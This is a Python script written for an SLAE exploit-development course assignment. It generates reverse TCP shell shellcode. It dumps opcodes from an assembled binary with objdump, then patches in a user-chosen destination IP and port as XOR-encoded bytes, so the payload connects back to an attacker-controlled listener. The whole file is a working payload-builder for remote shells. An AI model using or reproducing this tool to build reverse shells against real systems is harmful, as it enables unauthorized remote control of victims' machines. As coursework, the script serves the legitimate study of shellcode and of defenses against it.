#!/usr/bin/python

"""
 Filename:   reverse_tcp_shell_shellcoder.py
 Author:     Samuel Dugo
 SLAE-ID:    SLAE-1376
 Purpose:    Assignment #2 of SLAE certification. This code will configure the IP and Port for a reverse tcp shellcode.
"""

import binascii
import re
import socket
import subprocess
import sys

def getHexBinCode(code_to_insert, code_to_search, pattern_to_match):
    #Searches for a piece of shellcode to subsitute
    #and returns the shellcode modified
    code = ""
    m = re.match("^(.*?)"+pattern_to_match+"(.+)$",code_to_search)
    if m:
        code = m.group(1) + code_to_insert + m.group(2)
    return code

def getShellcode(bin_name,dest_ip,dest_port):
    #Gets initial shellcode
    objdump_command = "objdump -d ./"+bin_name+"|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ //g'|paste -d '' -s"
    process = subprocess.Popen(objdump_command, shell=True, stdout=subprocess.PIPE)
    hex_bin_code, err = process.communicate()
    #Substitute IP on shellcode
    ip_pattern_to_search = "7f000001"
    ip_xor_key = "FFFFFFFF"
    ip_hex = binascii.hexlify(socket.inet_aton(dest_ip))
    ip_xor_result = xorBinToHex(ip_hex,ip_xor_key)
    hex_bin_code = getHexBinCode(ip_xor_result, hex_bin_code, ip_pattern_to_search)
    #Substitue PORT on shellcode
    #Port number must be always 4 digits
    port_pattern_to_search = "22b8"
    port_xor_key = "FFFF"
    port_hex = hex(int(dest_port))
    port_xor_result = xorBinToHex(port_hex,port_xor_key)
    hex_bin_code = getHexBinCode(port_xor_result, hex_bin_code, port_pattern_to_search)   
    #Get final shellcode
    opcodes_key = ["\\x" + hex_bin_code[i:i+2] for i in range(0, len(hex_bin_code), 2)]
    print("Shellcode: " + ''.join(opcodes_key))
    print("------------------------------------------")
    print("Shellcode length: " + str(len(opcodes_key)))


def printError(error):
    #Handles error messages
    message = ""
    if error == 1:
        message = "An error occured while executing the program. Please, ensure you are invoking this program using the following syntax: ./reverse_tcp_shell_launcher.py BIN_OF_NASM DST_IP DST_PORT"
    elif error == 2:
        message = "Incorrect port number. Please specify a port number of 4 digits."
    elif error == 3:
        message = "Incorrect IP. Please specify a valid IP address."
    print(message)

def xorBinToHex(a,b):
    #Converts two hex strings to binary
    #and returns the XORed result of them in hex format
    binary_a = bin(int(a,16))[2:]
    binary_b = bin(int(b,16))[2:]
    xored_hex = format(int(binary_a,2) ^ int(binary_b,2),'02x')
    return xored_hex

def main():
    try:
        bin_name = sys.argv[1]
        dest_ip = sys.argv[2]
        dest_port = sys.argv[3]
        try:
            socket.inet_aton(dest_ip)
            if len(sys.argv[3]) ==  4 and sys.argv[3].isdigit():
                getShellcode(bin_name,dest_ip,dest_port)
            else:
                printError(2)
        except:
            printError(3)
    except:
        printError(1)

if __name__ == '__main__':
    main()